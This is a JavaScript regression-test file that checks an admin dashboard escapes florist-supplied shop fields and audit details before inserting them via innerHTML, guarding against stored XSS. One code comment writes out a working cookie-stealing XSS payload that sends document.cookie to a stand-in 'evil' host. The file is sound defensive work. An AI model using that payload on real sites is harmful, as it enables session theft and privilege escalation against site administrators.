import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";

const adminJs = fs.readFileSync(new URL("../public/admin.js", import.meta.url), "utf8");

function loadShopsBody() {
  const start = adminJs.indexOf("async function loadShops(");
  return adminJs.slice(start, adminJs.indexOf("\n", start));
}

function renderAuditBody() {
  const start = adminJs.indexOf("function renderAudit(");
  return adminJs.slice(start, adminJs.indexOf("\n", start));
}

test("loadShops escapes every florist-controlled field before innerHTML — stored XSS regression guard", () => {
  // Confirmed exploitable: shop.name/email/slug/city/state are florist-set,
  // unvalidated free text (see netlify/functions/settings.js field list —
  // no HTML-stripping validation on any of them) rendered straight into the
  // Platform Owner's admin session via innerHTML. A shop named
  // `<img src=x onerror=fetch('https://evil/steal?c='+document.cookie)>`
  // would execute with full platform-admin privileges the next time any
  // admin opened Florist Accounts. This is the same class of bug as any
  // other unescaped innerHTML sink, but the severity is higher here because
  // the attacker (any florist signup) and the victim (the platform owner)
  // are different trust levels — a real privilege-escalation path, not
  // just a self-XSS.
  const body = loadShopsBody();
  assert.match(body, /escapeHtml\(s\.name\)/, "shop name must be escaped");
  assert.match(body, /escapeHtml\(s\.email\|\|s\.slug\|\|''\)/, "email/slug fallback must be escaped");
  assert.match(body, /escapeHtml\(s\.city\|\|''\)/, "city must be escaped");
  assert.match(body, /escapeHtml\(s\.state\)/, "state must be escaped");
  assert.doesNotMatch(body, /<strong>\$\{s\.name\}<\/strong>/, "must not regress to the raw unescaped interpolation");
});

test("renderAudit escapes action names and JSON-stringified details before innerHTML", () => {
  // JSON.stringify does not HTML-escape < or >, so a details value
  // containing markup (e.g. from an admin-entered note) would still
  // execute unescaped inside the <code> block without this fix.
  const body = renderAuditBody();
  assert.match(body, /escapeHtml\(String\(x\.action\|\|''\)\.replaceAll/);
  assert.match(body, /escapeHtml\(JSON\.stringify\(x\.details\)\)/);
});

test("escapeHtml is defined and used consistently elsewhere in admin.js (loadOverview alerts) — confirms the helper existed and was simply skipped in loadShops before this fix", () => {
  assert.match(adminJs, /function escapeHtml\(v=''\)/);
  assert.match(adminJs, /escapeHtml\(a\.title\)/, "loadOverview already escaped — loadShops was the outlier");
});
